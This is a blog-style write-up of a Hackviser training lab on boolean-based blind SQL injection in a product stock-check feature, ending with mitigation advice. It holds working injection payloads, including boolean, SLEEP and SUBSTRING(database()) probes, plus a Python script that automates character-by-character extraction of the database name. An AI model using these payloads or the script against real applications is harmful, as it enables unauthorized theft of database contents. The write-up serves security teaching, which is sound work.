---
title: "SQL Injection – Database Extraction via Boolean-Based Blind Technique | Stock Check Lab"
date: 2026-05-02 3:05:00 +0530
categories: [Web Security, Injection]
tags: [sql-injection, blind-sqli, boolean-based, mysql, automation, data-extraction]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/blind-sql-injection-hackviser.webp
  alt: Boolean-based blind SQL injection data extraction
---

## Overview

This lab demonstrates a **Boolean-Based Blind SQL Injection vulnerability** in a stock-checking feature. Unlike classic SQL injection, the application does not return query results directly. Instead, data must be inferred based on differences in application responses.

By leveraging conditional logic, it was possible to extract the database name character by character.

---

## Objective

- Identify blind SQL injection in the stock-check feature
- Confirm injection using boolean conditions
- Determine database behavior
- Extract the database name manually and via automation

---

## Reconnaissance

The application provided a simple product search feature:

- **Input:** Product name
- **Output:**
  - "We have this product in stock"
  - "Product sold out"

This binary response pattern is ideal for **Boolean-based blind SQL injection**, where TRUE and FALSE conditions produce distinguishable outputs.

---

## Exploitation

### Step 1: Confirming SQL Injection

#### True Condition

```sql
iPhone11' AND '1'='1
```

**Response:**

```
We have this product in stock
```

#### False Condition

```sql
iPhone11' AND '1'='2
```

**Response:**

```
Product sold out
```

**Analysis**

- The query is injectable
- The backend evaluates logical conditions
- Response differences can be used as a side-channel

---

### Step 2: Identifying Database Behavior

To further validate backend execution, a time-based payload was used:

```sql
iPhone11' AND SLEEP(5)-- -
```

**Observation**

- The response was delayed by ~5 seconds
- Confirms query execution on the backend
- Strong indicator of a **MySQL** database

---

### Step 3: Manual Data Extraction

Since no data is directly returned, extraction must be done one character at a time using `SUBSTRING()`.

**Example Payload**

```sql
iPhone11' AND SUBSTRING(database(),1,1)='a'-- -
```

**Logic**

- If TRUE → "in stock"
- If FALSE → "sold out"

By iterating over characters and positions:

```sql
iPhone11' AND SUBSTRING(database(),2,1)='b'-- -
```

**Insight**

This method allows reconstruction of:

- Database name
- Table names
- Column names
- Actual data

However, it is extremely slow when done manually.

---

### Step 4: Automating the Attack

To efficiently extract the database name, the process was automated using Python.

```python
import requests
import string

url = "https://immense-hulk.europe1.hackviser.space/"
charset = string.ascii_lowercase + string.digits + "_-"
db_name = ""

for position in range(1, 50):
    for char in charset:
        payload = f"iPhone11' AND SUBSTRING(database(),{position},1)='{char}'-- -"
        data = {"search": payload}

        response = requests.post(url, data=data, verify=False)

        if "We have this product in stock" in response.text:
            db_name += char
            print(f"Found so far: {db_name}")
            break
    else:
        break

print(f"\nDatabase name: {db_name}")
```

**Execution**

```bash
python3 blind_sqli.py
```

**How It Works**

- Iterates over each character position
- Tests all possible characters
- Uses response differences to determine correctness
- Builds the database name progressively

---

### Proof of Exploitation

- Successfully extracted the database name
- Confirmed full blind SQL injection capability
- Demonstrated reliable data exfiltration without direct output

---

## Root Cause

The vulnerability exists due to:

- Direct use of user input in SQL queries
- Absence of parameterized queries
- No input validation or sanitization
- Application logic exposing conditional responses

---

## Impact

An attacker can:

- Extract database names, tables, and columns
- Retrieve sensitive data (credentials, tokens, secrets)
- Perform full database enumeration
- Escalate to further compromise depending on privileges

Even without visible output, the database can be fully reconstructed.

---

## Mitigation

### 1. Use Parameterized Queries

Always separate data from SQL logic:

```sql
SELECT * FROM products WHERE name = ?
```

### 2. Input Validation

- Restrict unexpected input patterns
- Enforce strict input formats

### 3. Least Privilege

- Limit database permissions
- Prevent unnecessary access to metadata

### 4. Secure Error Handling

- Avoid revealing query behavior
- Standardize responses to reduce inference

### 5. Additional Protection

- Implement WAF rules to detect SQLi patterns
- Use ORM frameworks for safer query handling

---

## Real-World Insight

Blind SQL injection is often overlooked because:

- It does not immediately expose data
- It appears less severe than classic SQLi

However, in real-world scenarios, attackers can:

- Fully extract databases
- Steal credentials silently
- Operate without triggering obvious alerts

Given enough time, blind SQL injection is just as powerful as visible SQL injection.

---

## Conclusion

This lab highlights how subtle differences in application behavior can be exploited to extract sensitive data.

Even when query results are hidden, improper input handling allows attackers to reconstruct database contents with precision.

Secure query design and strict input validation are critical to defending against such attacks.